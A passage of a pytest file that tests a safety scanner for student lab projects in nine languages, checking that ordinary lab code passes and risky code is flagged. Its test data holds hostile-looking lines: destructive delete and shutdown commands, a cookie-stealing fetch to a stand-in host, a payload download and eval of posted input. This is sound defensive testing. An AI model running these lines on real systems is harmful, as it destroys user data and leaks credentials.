"""Проверка кода на опасное: обычные лабы проходят, опасное находится. Ложная тревога так же плоха, как пропуск."""

import re

import pytest

from forlabs.runner.plan import ProjectPlan
from forlabs.runner.safety import scan

ENTRY = {"csharp": "Program.cs", "cpp": "main.cpp", "python": "main.py", "java": "Main.java", "javascript": "main.js",
         "web": "index.html", "php": "index.php", "go": "main.go", "mysql": "lab.sql"}
KIND = {"web": "web", "mysql": "sql"}


def plan(lang, code, extra=None, kind=None):
    files = [{"path": ENTRY[lang], "content": code}] + [{"path": p, "content": c} for p, c in (extra or {}).items()]
    return ProjectPlan(language=lang, kind=kind or KIND.get(lang, "console"), name="Лаба", files=files,
                       entry=ENTRY[lang])


# ---------- C# ----------

CS_CLEAN = {
    "калькулятор": r'''
using System;
using System.Text;

namespace Calc
{
    class Program
    {
        // Не используем Process.Start и реестр: только ввод и вывод
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.Write("Введите первое число: ");
            double a = double.Parse(Console.ReadLine());
            Console.Write("Введите второе число: ");
            double b = double.Parse(Console.ReadLine());
            Console.WriteLine($"Сумма: {a + b}\nРазность: {a - b}");
            Console.WriteLine("Матрица A:\n1 2\n3 4");
            Console.WriteLine("Справка: https://learn.microsoft.com/ru-ru/dotnet/");
            Console.ReadKey();
        }
    }
}
''',
    "файлы рядом с программой": r'''
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;

class Student { public string Name { get; set; } public double Avg { get; set; } }

class Program
{
    static void Main()
    {
        var json = File.ReadAllText("students.json");
        var list = JsonSerializer.Deserialize<List<Student>>(json);
        var best = list.Where(s => s.Avg >= 8).OrderByDescending(s => s.Avg).ToList();
        File.WriteAllLines("results.txt", best.Select(s => $"{s.Name};{s.Avg:F1}"));
        using (var w = new StreamWriter(Path.Combine("out", "log.txt"), true)) w.WriteLine("Готово");
        if (File.Exists("temp.txt")) File.Delete("temp.txt");
        Directory.CreateDirectory("backup");
        File.Copy("results.txt", @"backup\results.txt", true);
        Console.WriteLine($"Отличников: {best.Count}");
    }
}
''',
    "winforms": r'''
using System;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Shop
{
    public partial class MainForm : Form
    {
        private readonly TextBox inputPrice = new TextBox { Name = "inputPrice", Left = 20, Top = 20 };
        private readonly Button calc = new Button { Name = "calc", Text = "Рассчитать", Left = 20, Top = 60 };
        private readonly Label result = new Label { Name = "result", Left = 20, Top = 100, Width = 300 };
        private readonly Timer timer = new Timer { Interval = 1000 };

        public MainForm()
        {
            Text = "Магазин";
            calc.Click += (s, e) =>
            {
                if (!decimal.TryParse(inputPrice.Text, out var price))
                {
                    MessageBox.Show("Введите цену", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                result.Text = "Со скидкой: " + (price * 0.9m).ToString("F2");
            };
            Controls.AddRange(new Control[] { inputPrice, calc, result });
        }

        private void SaveClick(object sender, EventArgs e)
        {
            using var dlg = new SaveFileDialog { Filter = "Текст|*.txt" };
            if (dlg.ShowDialog() == DialogResult.OK) System.IO.File.WriteAllText(dlg.FileName, result.Text);
        }

        [STAThread]
        static void Main() { Application.EnableVisualStyles(); Application.Run(new MainForm()); }
    }
}
''',
    "рефлексия и коллекции": r'''
using System;
using System.Reflection;

class Point { public int X { get; set; } public int Y { get; set; } public override string ToString() => $"({X}; {Y})"; }

class Program
{
    static void Main()
    {
        Type t = typeof(Point);
        foreach (PropertyInfo p in t.GetProperties()) Console.WriteLine("Свойство: " + p.Name);
        object obj = Activator.CreateInstance(t);
        t.GetProperty("X").SetValue(obj, 5);
        Console.WriteLine("Сборка: " + Assembly.GetExecutingAssembly().GetName().Name);
        string path = "C:" + "\\" + "Нет";   // строки по частям не путь
        Console.WriteLine("Точка: " + obj + " Время: 12:30");
    }
}
''',
}

CS_BAD = {
    "Process.Start": ('System.Diagnostics.Process.Start("notepad.exe");', "запускает"),
    "ProcessStartInfo": ('var psi = new ProcessStartInfo("cmd.exe", "/c del *.*"); Process p = new Process();', "запускает"),
    "реестр": ('Registry.CurrentUser.CreateSubKey(@"Software\\Lab").SetValue("x", 1);', "реестр"),
    "рабочий стол": ('File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "a.txt"));',
                     "вне папки"),
    "диск C": ('Directory.Delete(@"C:\\Temp\\old", true);', "вне папки"),
    "USERPROFILE": ('var home = Environment.GetEnvironmentVariable("USERPROFILE");', "вне папки"),
    "%APPDATA%": ('File.WriteAllText(Environment.ExpandEnvironmentVariables("%APPDATA%\\\\x.txt"), "1");', "вне папки"),
    "..": ('File.WriteAllText("..\\\\..\\\\..\\\\data.txt", "1");', "вне папки"),
    "DllImport": ('[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int type);',
                  "системные"),
    "HttpClient": ('var html = new HttpClient().GetStringAsync("https://example.com").Result;', "сет"),
    "WebClient": ('new WebClient().DownloadFile("http://93.184.216.34/a.exe", "a.exe");', "сет"),
    "TcpListener на всех адресах": ('var server = new TcpListener(IPAddress.Any, 8888); server.Start();', "сет"),
    "unsafe": ('unsafe { int x = 5; int* p = &x; Console.WriteLine(*p); }', "unsafe"),
    "Assembly.LoadFrom": ('var asm = Assembly.LoadFrom("plugin.dll");', "код"),
}


def cs_main(body):
    return "using System;\nusing System.IO;\nclass Program {\n  static void Main() {\n    " + body + "\n  }\n}\n"


@pytest.mark.parametrize("name", CS_CLEAN)
def test_csharp_clean(name):
    kind = "winforms" if name == "winforms" else "console"
    assert scan(plan("csharp", CS_CLEAN[name], kind=kind)) == []


@pytest.mark.parametrize("name", CS_BAD)
def test_csharp_dangerous(name):
    body, word = CS_BAD[name]
    found = scan(plan("csharp", cs_main(body)))
    assert found and any(word in r for r in found), found


def test_csharp_xaml_object_provider_and_resx_object():
    xaml = ('<Window xmlns:diag="clr-namespace:System.Diagnostics;assembly=System">\n<Window.Resources>\n'
            '<ObjectDataProvider x:Key="p" ObjectType="{x:Type diag:Process}" MethodName="Start"/>\n'
            '</Window.Resources></Window>')
    assert scan(plan("csharp", CS_CLEAN["калькулятор"], {"MainWindow.xaml": xaml}, kind="wpf"))
    resx = '<data name="x" mimetype="application/x-microsoft.net.object.binary.base64"><value>AAEAAAD</value></data>'
    assert scan(plan("csharp", CS_CLEAN["калькулятор"], {"Form1.resx": resx}))
    ok_xaml = '<Window Title="Калькулятор"><StackPanel><TextBox x:Name="inputA"/><Button Content="="/></StackPanel></Window>'
    assert scan(plan("csharp", CS_CLEAN["калькулятор"], {"MainWindow.xaml": ok_xaml}, kind="wpf")) == []


# ---------- C++ ----------

CPP_CLEAN = {
    "консоль с chcp и pause": r'''
#include <iostream>
#include <windows.h>
#include <cstdlib>
using namespace std;

int main() {
    SetConsoleCP(65001);
    SetConsoleOutputCP(65001);
    setlocale(LC_ALL, "Russian");
    system("chcp 65001 > nul");
    system("cls");
    // system("format c:") — так делать нельзя, это только комментарий
    /* Process.Start, ShellExecute, RegOpenKeyEx — в комментарии не считаются */
    int n;
    cout << "Введите размер массива: ";
    cin >> n;
    long long big = 1'000'000;
    char c = '\'';
    printf("Матрица A:\n");
    cout << "Сумма: " << n + big << endl;
    system("pause");
    return 0;
}
''',
    "файлы": r'''
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include "student.h"

int main() {
    std::ifstream in("input.txt");
    std::ofstream out("result.txt");
    std::vector<int> v;
    int x;
    while (in >> x) v.push_back(x);
    for (int i : v) out << i * 2 << "\n";
    std::remove("temp.txt");
    std::rename("result.txt", "results/result.txt");
    std::cout << "Записано чисел: " << v.size() << std::endl;
    std::system("PAUSE");
}
''',
    "классы и шаблоны": r'''
#include <iostream>
#include <algorithm>
#include <string>
using namespace std;

template <typename T>
class Stack {
    T data[100]; int top = 0;
public:
    void push(const T& x) { data[top++] = x; }
    T pop() { return data[--top]; }
    bool empty() const { return top == 0; }
};

struct Book { string title; int year; };

int main() {
    Stack<int> s;
    for (int i = 0; i < 5; i++) s.push(i * i);
    while (!s.empty()) cout << s.pop() << " ";
    Book books[] = {{"Война и мир", 1869}, {"Идиот", 1869}};
    sort(begin(books), end(books), [](const Book& a, const Book& b) { return a.year < b.year; });
    cout << "\nКнига: " << books[0].title << "\tгод: " << books[0].year << "\\n";
    const char* path = "D:";  // просто строка
    return 0;
}
''',
}

CPP_BAD = {
    "system(команда)": ('system("shutdown /s /t 0");', "запускает"),
    "system(переменная)": ('std::string cmd = "dir"; system(cmd.c_str());', "запускает"),
    "chcp и удаление": ('system("chcp 1251 && del /q *.*");', "запускает"),
    "remove с диска C": ('remove("C:\\\\Windows\\\\win.ini");', "вне папки"),
    "реестр": ('HKEY k; RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_ALL_ACCESS, &k);', "реестр"),
    "LoadLibrary": ('HMODULE h = LoadLibraryA("evil.dll");', "системные"),
    "ShellExecute": ('ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);', "запускает"),
    "remove_all ..": ('std::filesystem::remove_all("../");', "вне папки"),
    "popen": ('FILE* f = _popen("dir", "r");', "запускает"),
}


@pytest.mark.parametrize("name", CPP_CLEAN)
def test_cpp_clean(name):
    assert scan(plan("cpp", CPP_CLEAN[name], {"student.h": "#pragma once\nstruct Student { int id; };\n"})) == []


@pytest.mark.parametrize("name", CPP_BAD)
def test_cpp_dangerous(name):
    body, word = CPP_BAD[name]
    code = "#include <windows.h>\n#include <cstdio>\n#include <string>\nint main() {\n    " + body + "\n}\n"
    found = scan(plan("cpp", code))
    assert found and any(word in r for r in found), found


def test_cpp_winsock_include():
    code = '#include <winsock2.h>\n#pragma comment(lib, "ws2_32.lib")\nint main() { WSADATA w; WSAStartup(MAKEWORD(2,2), &w); }\n'
    assert any("сет" in r for r in scan(plan("cpp", code)))


# ---------- Python ----------

PY_CLEAN = {
    "ввод и вывод": '''
# Лабораторная работа: калькулятор. Здесь нет eval() и os.system — только float()
a = float(input("Введите a: "))
b = float(input("Введите b: "))
print(f"Сумма: {a + b:.2f}")
print("Пример строки с exec( внутри — это просто текст")
''',
    "файлы и json": '''
import json
import os
import csv
from pathlib import Path

DATA = Path(__file__).parent / "students.json"


def load():
    with open("students.json", encoding="utf-8") as f:
        return json.load(f)


def save(rows):
    with open("results.txt", "w", encoding="utf-8") as f:
        for r in rows:
            f.write(f"{r['name']};{r['avg']}\\n")
    with open(os.path.join("out", "table.csv"), "w", newline="", encoding="utf-8") as f:
        csv.writer(f).writerows([[r["name"], r["avg"]] for r in rows])


if __name__ == "__main__":
    rows = sorted(load(), key=lambda r: -r["avg"])
    save(rows)
    if os.path.exists("temp.txt"):
        os.remove("temp.txt")
    print("Лучший студент:", rows[0]["name"])
''',
    "tkinter": '''
import tkinter as tk
from tkinter import messagebox, ttk


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Конвертер валют")
        self.amount = ttk.Entry(self, name="amount")
        self.amount.pack(padx=10, pady=5)
        ttk.Button(self, text="Перевести", command=self.convert).pack()
        self.result = ttk.Label(self, text="Результат:")
        self.result.pack()

    def convert(self):
        try:
            value = float(self.amount.get())
        except ValueError:
            messagebox.showerror("Ошибка", "Введите число")
            return
        self.result["text"] = f"Результат: {value / 3.2:.2f} USD"


if __name__ == "__main__":
    App().mainloop()
''',
    "классы, re, sqlite, msvcrt": '''
import ast
import re
import sqlite3
import msvcrt
import random
import math


class Shape:
    def area(self):
        raise NotImplementedError


class Circle(Shape):
    def __init__(self, r):
        self.r = r

    def area(self):
        return math.pi * self.r ** 2


pattern = re.compile(r"^[А-ЯЁ][а-яё]+$")
items = ast.literal_eval("[1, 2, 3]")
con = sqlite3.connect("shop.db")
con.execute("CREATE TABLE IF NOT EXISTS goods (name TEXT, price REAL)")
con.execute("DELETE FROM goods WHERE price < 0")
print("Площадь:", round(Circle(random.randint(1, 5)).area(), 2), items)
msvcrt.getch()
''',
}

PY_BAD = {
    "os.system": ('import os\nos.system("del /q C:\\\\Users\\\\*")\n', "запускает"),
    "subprocess": ('import subprocess\nsubprocess.run(["notepad.exe"])\n', "запускает"),
    "rmtree дома": ('import shutil, os\nshutil.rmtree(os.path.expanduser("~/Documents"))\n', "вне папки"),
    "requests": ('import requests\nprint(requests.get("https://api.github.com").json())\n', "сет"),
    "urllib": ('from urllib.request import urlopen\nprint(urlopen("http://example.com").read())\n', "сет"),
    "eval": ('expr = input("Выражение: ")\nprint(eval(expr))\n', "код"),
    "exec": ('exec(open("plugin.py").read())\n', "код"),
    "__import__": ('__import__("o" + "s").system("calc")\n', "код"),
    "ctypes": ('import ctypes\nctypes.windll.user32.MessageBoxW(0, "Привет", "Окно", 0)\n', "системные"),
    "winreg": ('import winreg\nkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software")\n', "реестр"),
    "..": ('with open("../../secret.txt", "w") as f:\n    f.write("x")\n', "вне папки"),
    "socket": ('import socket\ns = socket.socket()\ns.connect(("example.com", 80))\n', "сет"),
    "from os import system": ('from os import system, getcwd\nsystem("cls")\n', "запускает"),
}


@pytest.mark.parametrize("name", PY_CLEAN)
def test_python_clean(name):
    assert scan(plan("python", PY_CLEAN[name], kind="gui" if name == "tkinter" else "console")) == []


@pytest.mark.parametrize("name", PY_BAD)
def test_python_dangerous(name):
    code, word = PY_BAD[name]
    found = scan(plan("python", code))
    assert found and any(word in r for r in found), found


# ---------- Java ----------

JAVA_CLEAN = {
    "консоль": '''
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);
        System.out.print("Введите количество элементов: ");
        int n = in.nextInt();
        int[] a = new int[n];
        for (int i = 0; i < n; i++) a[i] = i * i;
        // Runtime.getRuntime().exec — не используем
        System.out.println("Сумма квадратов: " + java.util.Arrays.stream(a).sum());
        String text = """
            Многострочный текст: exec("x") тут просто слова
            """;
        System.out.println(text);
    }
}
''',
    "файлы": '''
import java.io.*;
import java.nio.file.*;
import java.util.*;

public class Main {
    public static void main(String[] args) throws IOException {
        List<String> lines = Files.readAllLines(Paths.get("data.txt"));
        try (PrintWriter out = new PrintWriter(new FileWriter("output.txt"))) {
            for (String s : lines) out.println(s.toUpperCase());
        }
        new File("temp.txt").delete();
        Files.createDirectories(Paths.get("reports"));
        Files.write(Path.of("reports", "summary.txt"), List.of("Строк: " + lines.size()));
        System.out.println("Готово, строк: " + lines.size());
    }
}
''',
    "swing": '''
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;

public class Main extends JFrame {
    private final JTextField input = new JTextField(10);
    private final JLabel result = new JLabel("Результат:");

    public Main() {
        super("Перевод температуры");
        JButton convert = new JButton("Перевести");
        convert.setName("convert");
        convert.addActionListener(e -> {
            try {
                double c = Double.parseDouble(input.getText());
                result.setText("Результат: " + (c * 9 / 5 + 32) + " °F");
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(this, "Введите число", "Ошибка", JOptionPane.ERROR_MESSAGE);
            }
        });
        setLayout(new FlowLayout());
        add(input); add(convert); add(result);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        pack();
    }

    public static void main(String[] args) { SwingUtilities.invokeLater(() -> new Main().setVisible(true)); }
}
''',
    "jdbc и рефлексия": '''
import java.lang.reflect.Field;
import java.sql.*;

public class Main {
    static class Student { String name = "Иван"; int age = 19; }

    public static void main(String[] args) throws Exception {
        for (Field f : Student.class.getDeclaredFields()) System.out.println("Поле: " + f.getName());
        Class.forName("com.mysql.cj.jdbc.Driver");
        try (Connection c = DriverManager.getConnection("jdbc:mysql://localhost:3306/college", "root", "");
             Statement st = c.createStatement()) {
            st.executeUpdate("CREATE TABLE IF NOT EXISTS students (id INT PRIMARY KEY, name VARCHAR(50))");
            ResultSet rs = st.executeQuery("SELECT name FROM students");
            while (rs.next()) System.out.println(rs.getString(1));
        }
    }
}
''',
}

JAVA_BAD = {
    "Runtime.exec": ('Runtime.getRuntime().exec("cmd /c del *.*");', "запускает"),
    "ProcessBuilder": ('new ProcessBuilder("notepad.exe").start();', "запускает"),
    "URL": ('var s = new java.net.URL("https://example.com").openStream();', "сет"),
    "user.home": ('java.nio.file.Files.delete(java.nio.file.Paths.get(System.getProperty("user.home"), "a.txt"));',
                  "вне папки"),
    "Preferences": ('java.util.prefs.Preferences.userRoot().put("lab", "1");', "реестр"),
    "loadLibrary": ('System.loadLibrary("native");', "системные"),
    "Socket": ('var s = new java.net.Socket("93.184.216.34", 80);', "сет"),
    "абсолютный путь": ('new java.io.FileWriter("C:/Windows/lab.txt").close();', "вне папки"),
    "ScriptEngine": ('new javax.script.ScriptEngineManager().getEngineByName("js").eval("1+1");', "код"),
}


@pytest.mark.parametrize("name", JAVA_CLEAN)
def test_java_clean(name):
    assert scan(plan("java", JAVA_CLEAN[name], kind="gui" if name == "swing" else "console")) == []


@pytest.mark.parametrize("name", JAVA_BAD)
def test_java_dangerous(name):
    body, word = JAVA_BAD[name]
    code = "public class Main {\n    public static void main(String[] args) throws Exception {\n        " + body + "\n    }\n}\n"
    found = scan(plan("java", code))
    assert found and any(word in r for r in found), found


# ---------- JavaScript (Node) ----------

JS_CLEAN = {
    "readline": '''
const readline = require("readline");
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
// eval() и child_process не нужны
rl.question("Введите a: ", (a) => {
  rl.question("Введите b: ", (b) => {
    console.log(`Сумма: ${Number(a) + Number(b)}`);
    const re = /^\\d+$/;
    console.log("Только цифры:", re.test(a));
    rl.close();
  });
});
''',
    "файлы": '''
const fs = require("fs");
const path = require("path");

const students = JSON.parse(fs.readFileSync("students.json", "utf8"));
const best = students.filter((s) => s.avg >= 8).map((s) => `${s.name};${s.avg}`);
fs.writeFileSync(path.join(__dirname, "results.txt"), best.join("\\n"), "utf8");
fs.mkdirSync("out", { recursive: true });
fs.writeFileSync("out/report.txt", "Отчёт готов");
if (fs.existsSync("temp.txt")) fs.unlinkSync("temp.txt");
console.log("Отличников:", best.length);
''',
    "сервер на localhost": '''
const http = require("http");
const fs = require("fs");

const server = http.createServer((req, res) => {
  if (req.url === "/") {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(fs.readFileSync("index.html"));
  } else {
    res.writeHead(404);
    res.end("Не найдено");
  }
});
server.listen(3000, "127.0.0.1", () => console.log("Сервер: http://localhost:3000"));
''',
    "классы и модули": '''
import { readFile } from "node:fs/promises";
import { sum } from "./lib/math.js";

class Account {
  #balance = 0;
  deposit(x) { if (x <= 0) throw new Error("Сумма должна быть больше нуля"); this.#balance += x; }
  get balance() { return this.#balance; }
}

const acc = new Account();
acc.deposit(sum(100, 50));
const text = await readFile("data.txt", "utf8");
console.log(`Баланс: ${acc.balance}, строк в файле: ${text.split("\\n").length}`);
''',
}

JS_BAD = {
    "child_process": ('const { exec } = require("child_process");\nexec("dir", (e, out) => console.log(out));\n', "запускает"),
    "node:child_process": ('import { spawn } from "node:child_process";\nspawn("calc.exe");\n', "запускает"),
    "eval": ('const expr = process.argv[2];\nconsole.log(eval(expr));\n', "код"),
    "new Function": ('const f = new Function("a", "b", "return a + b");\nconsole.log(f(1, 2));\n', "код"),
    "fetch наружу": ('fetch("https://api.example.com/data").then((r) => r.json()).then(console.log);\n', "сет"),
    "домашняя папка": ('const fs = require("fs");\nconst os = require("os");\n'
                       'fs.rmSync(os.homedir() + "/Documents", { recursive: true });\n', "вне папки"),
    "диск C": ('require("fs").writeFileSync("C:\\\\Windows\\\\lab.txt", "x");\n', "вне папки"),
    "USERPROFILE": ('console.log(process.env.USERPROFILE);\n', "вне папки"),
    "https.get": ('const https = require("https");\nhttps.get("https://example.com", (r) => r.pipe(process.stdout));\n',
                  "сет"),
}


@pytest.mark.parametrize("name", JS_CLEAN)
def test_javascript_clean(name):
    extra = {"lib/math.js": "export const sum = (a, b) => a + b;\n", "package.json": '{"type": "module"}'}
    assert scan(plan("javascript", JS_CLEAN[name], extra)) == []


@pytest.mark.parametrize("name", JS_BAD)
def test_javascript_dangerous(name):
    code, word = JS_BAD[name]
    found = scan(plan("javascript", code))
    assert found and any(word in r for r in found), found


# ---------- HTML/CSS/JS ----------

WEB_CLEAN = {
    "страница с bootstrap": '''<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <title>Кофейня «Зерно»</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="css/style.css" rel="stylesheet">
</head>
<body>
  <!-- <script>eval("комментарий")</script> -->
  <h1>Меню</h1>
  <p>Не используйте eval() в своих проектах! Подробнее: https://developer.mozilla.org</p>
  <a href="https://vk.com/coffee">Мы ВКонтакте</a>
  <button id="order">Заказать</button>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="js/script.js"></script>
  <script>
    document.getElementById("order").addEventListener("click", () => {
      const count = Number(localStorage.getItem("orders") || 0) + 1;
      localStorage.setItem("orders", count);
      alert(`Заказов: ${count}`);
    });
  </script>
</body>
</html>
''',
    "скрипт с fetch локального json": '''<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Каталог</title></head>
<body><ul id="list"></ul>
<script>
  fetch("data/products.json")
    .then((r) => r.json())
    .then((items) => {
      const ul = document.getElementById("list");
      for (const it of items) {
        const li = document.createElement("li");
        li.textContent = `${it.name} — ${it.price} руб.`;
        ul.appendChild(li);
      }
    });
</script></body></html>
''',
    "форма с проверкой": '''<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Регистрация</title>
<style>input:invalid { border-color: red; } .hint::after { content: "../"; }</style></head>
<body>
<form id="reg" action="#"><input id="email" type="email" required><button>Отправить</button></form>
<script>
  const form = document.querySelector("#reg");
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const ok = /^[^@\\s]+@[^@\\s]+\\.[a-z]{2,}$/i.test(form.email.value);
    document.title = ok ? "Готово" : "Ошибка в почте";
    window.location.href = "thanks.html";
  });
</script></body></html>
''',
}

WEB_BAD = {
    "fetch наружу": '<script>fetch("https://api.example.com/steal?c=" + document.cookie);</script>',
    "eval": '<script>const code = prompt("Код"); eval(code);</script>',
    "WebSocket": '<script>const ws = new WebSocket("wss://evil.example.com/socket");</script>',
}


@pytest.mark.parametrize("name", WEB_CLEAN)
def test_web_clean(name):
    assert scan(plan("web", WEB_CLEAN[name], {"js/script.js": "console.log('Привет');\n"})) == []


@pytest.mark.parametrize("name", WEB_BAD)
def test_web_dangerous(name):
    html = '<!doctype html><html lang="ru"><head><meta charset="utf-8"></head><body>\n' + WEB_BAD[name] + "\n</body></html>"
    assert scan(plan("web", html))


def test_web_separate_js_file_is_scanned():
    page = '<!doctype html><html><body><script src="js/app.js"></script></body></html>'
    found = scan(plan("web", page, {"js/app.js": 'fetch("https://api.example.com/x");\n'}))
    assert any("js/app.js" in r for r in found)


# ---------- PHP ----------

PHP_CLEAN = {
    "консоль": r'''<?php
// Калькулятор: exec() и system() тут не нужны
echo "Введите a: ";
$a = (float)trim(fgets(STDIN));
echo "Введите b: ";
$b = (float)trim(fgets(STDIN));
echo "Сумма: " . ($a + $b) . "\n";
printf("Среднее: %.2f\n", ($a + $b) / 2);
''',
    "сайт с PDO": r'''<?php
session_start();
require_once "header.php";
include 'config.php';
$pdo = new PDO("mysql:host=localhost;dbname=shop;charset=utf8mb4", "root", "");
$pdo->exec("CREATE TABLE IF NOT EXISTS goods (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(100), price DECIMAL(10,2))");
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $stmt = $pdo->prepare("INSERT INTO goods (name, price) VALUES (?, ?)");
    $stmt->execute([$_POST["name"], $_POST["price"]]);
    file_put_contents("log.txt", date("d.m.Y H:i") . " добавлен товар\n", FILE_APPEND);
    header("Location: index.php");
    exit;
}
$goods = $pdo->query("SELECT * FROM goods ORDER BY price")->fetchAll(PDO::FETCH_ASSOC);
?>
<!doctype html>
<html lang="ru">
<head><meta charset="utf-8"><title>Магазин</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"></head>
<body>
<h1>Товары</h1>
<a href="https://vk.com/shop">Мы ВКонтакте</a>
<?php foreach ($goods as $g): ?>
  <p><?= htmlspecialchars($g["name"]) ?> — <?= $g["price"] ?> руб.</p>
<?php endforeach; ?>
<script>const total = `Итого: ${document.querySelectorAll("p").length}`; console.log(total);</script>
</body>
</html>
''',
    "установка базы": r'''<?php
$db = new mysqli("localhost", "root", "");
$db->query("DROP DATABASE IF EXISTS library");
$db->query("CREATE DATABASE library CHARACTER SET utf8mb4");
$db->select_db("library");
$db->query("CREATE TABLE books (id INT PRIMARY KEY AUTO_INCREMENT, title VARCHAR(200))");
if (file_exists("uploads/old.jpg")) unlink("uploads/old.jpg");
echo "База создана\n";
''',
}

PHP_BAD = {
    "shell_exec": ('<?php echo shell_exec("dir");', "запускает"),
    "system": ('<?php system("ls -la");', "запускает"),
    "обратные кавычки": ('<?php $out = `whoami`; echo $out;', "запускает"),
    "eval": ('<?php eval($_POST["code"]);', "код"),
    "file_get_contents наружу": ('<?php $html = file_get_contents("https://example.com/api");', "сет"),
    "curl": ('<?php $ch = curl_init("https://api.example.com"); curl_exec($ch);', "сет"),
    "unlink с диска C": ('<?php unlink("C:\\\\Windows\\\\system.ini");', "вне папки"),
    "DROP DATABASE чужой": ('<?php $pdo->exec("DROP DATABASE world");', "баз"),
    "GRANT": ('<?php $pdo->exec("GRANT ALL PRIVILEGES ON *.* TO \'x\'@\'%\'");', "пользоват"),
}


@pytest.mark.parametrize("name", PHP_CLEAN)
def test_php_clean(name):
    kind = "console" if name == "консоль" else "web"
    extra = {"header.php": "<header>Шапка</header>\n", "config.php": "<?php $title = 'Магазин';\n",
             "pages/about.php": '<?php include "../header.php"; ?>\n<p>О нас</p>\n'}
    assert scan(plan("php", PHP_CLEAN[name], extra, kind=kind)) == []


@pytest.mark.parametrize("name", PHP_BAD)
def test_php_dangerous(name):
    code, word = PHP_BAD[name]
    found = scan(plan("php", code))
    assert found and any(word in r for r in found), found


# ---------- Go ----------

GO_CLEAN = {
    "ввод": '''package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Введите имя: ")
	name, _ := reader.ReadString('\\n')
	// exec.Command здесь не нужен
	fmt.Printf("Привет, %s!\\n", strings.TrimSpace(name))
	fmt.Println(`Сырая строка: \\d+ и "C" — оценка`)
}
''',
    "файлы": '''package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
)

func main() {
	data, err := os.ReadFile("data.txt")
	if err != nil {
		fmt.Println("Ошибка:", err)
		return
	}
	words := strings.Fields(string(data))
	sort.Strings(words)
	os.MkdirAll("out", 0o755)
	os.WriteFile(filepath.Join("out", "sorted.txt"), []byte(strings.Join(words, "\\n")), 0o644)
	os.Remove("temp.txt")
	fmt.Println("Слов:", len(words), "оценка:", "C")
}
''',
    "горутины": '''package main

import (
	"fmt"
	"sync"
	"time"
)

type Worker struct{ ID int }

func (w Worker) Do(wg *sync.WaitGroup, out chan<- string) {
	defer wg.Done()
	time.Sleep(10 * time.Millisecond)
	out <- fmt.Sprintf("Рабочий %d закончил", w.ID)
}

func main() {
	var wg sync.WaitGroup
	out := make(chan string, 3)
	for i := 1; i <= 3; i++ {
		wg.Add(1)
		go Worker{ID: i}.Do(&wg, out)
	}
	wg.Wait()
	close(out)
	for s := range out {
		fmt.Println(s)
	}
}
''',
}

GO_BAD = {
    "exec.Command": ('import (\n\t"os/exec"\n)\n\nfunc main() {\n\texec.Command("cmd", "/c", "dir").Run()\n}\n', "запускает"),
    "http.Get": ('import (\n\t"net/http"\n)\n\nfunc main() {\n\thttp.Get("https://example.com")\n}\n', "сет"),
    "UserHomeDir": ('import (\n\t"os"\n\t"path/filepath"\n)\n\nfunc main() {\n\th, _ := os.UserHomeDir()\n'
                    '\tos.RemoveAll(filepath.Join(h, "Documents"))\n}\n', "вне папки"),
    "unsafe": ('import (\n\t"fmt"\n\t"unsafe"\n)\n\nfunc main() {\n\tx := 1\n\tfmt.Println(unsafe.Pointer(&x))\n}\n',
               "unsafe"),
    "реестр": ('import "golang.org/x/sys/windows/registry"\n\nfunc main() {\n\tregistry.OpenKey(registry.CURRENT_USER, '
             '"Software", registry.ALL_ACCESS)\n}\n', "реестр"),
    "syscall": ('import "syscall"\n\nfunc main() {\n\tsyscall.LoadDLL("user32.dll")\n}\n', "системные"),
}


@pytest.mark.parametrize("name", GO_CLEAN)
def test_go_clean(name):
    assert scan(plan("go", GO_CLEAN[name])) == []


@pytest.mark.parametrize("name", GO_BAD)
def test_go_dangerous(name):
    code, word = GO_BAD[name]
    found = scan(plan("go", "package main\n\n" + code))
    assert found and any(word in r for r in found), found


# ---------- MySQL ----------

SQL_CLEAN = {
    "библиотека": '''
-- Лабораторная работа: база «Библиотека». Без GRANT и DROP USER.
DROP DATABASE IF EXISTS library;
CREATE DATABASE library CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE library;
CREATE TABLE authors (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(100) NOT NULL);
CREATE TABLE books (
  id INT AUTO_INCREMENT PRIMARY KEY,
  title VARCHAR(200) NOT NULL,
  author_id INT,
  grant_amount DECIMAL(10, 2) DEFAULT 0, # поле про грант
  FOREIGN KEY (author_id) REFERENCES authors (id) ON DELETE CASCADE
);
INSERT INTO authors (name) VALUES ('Лев Толстой'), ('Фёдор Достоевский');
INSERT INTO books (title, author_id) VALUES ('Война и мир', 1), ('Идиот', 2), ('Путь: C:\\\\книги', 2);
